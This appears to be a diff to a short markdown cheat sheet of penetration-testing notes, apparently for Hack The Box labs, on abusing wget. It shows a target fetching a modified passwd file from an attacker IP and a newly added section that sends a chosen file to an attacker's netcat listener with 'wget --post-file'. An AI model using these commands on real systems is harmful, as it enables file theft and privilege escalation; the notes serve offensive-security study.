@@ -15,7 +15,7 @@ https://www.exploit-db.com/
 https://github.com/SolomonSklash/htbenum
 
 
-## WGET
+## WGET 1 
 
 ### Attacker
 
@@ -35,3 +35,22 @@ wget -O passwd http://192.168.1.108:8000/passwd
 ```
 
 login or su to that user with the password 'pass123'
+
+## WGET 2
+
+### Attacker
+
+open netcat to allow the target to push the file
+
+```
+nc -lvnp 1234
+```
+
+### Target
+
+```
+URL=attacker_ip:1234
+LFILE=file_to_send
+wget --post-file=$LFILE $URL
+```
+
